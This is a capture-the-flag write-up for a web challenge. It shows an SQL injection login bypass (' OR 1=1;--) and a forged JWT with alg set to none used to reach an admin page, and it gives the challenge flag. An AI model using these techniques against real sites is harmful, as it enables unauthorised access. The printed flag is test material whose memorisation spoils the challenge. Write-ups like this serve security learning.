# Jay. W. Tee

## Description

Mr. Jay W. Tee seems to think his website is pretty secure.

https://lt560zwl9uv6.boroctf.com/

## Solution Walkthrough

After entering, I tried SQL injection by using `admin` as the username and `' OR 1=1;--` as the password, which successfully logged me in.

Afterward, I obtained a JWT and attempted to brute-force its secret, but it failed.

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.CQTNZMNpCfnOH77zxgTiJOHoS86V99_JsiAF3az3dEo
```

Then, I thought about testing whether changing the `alg` to `none` would work, and it actually did. Accessing `/admin` successfully gave me the flag.

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.
```

## Flag

```text
boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}
```
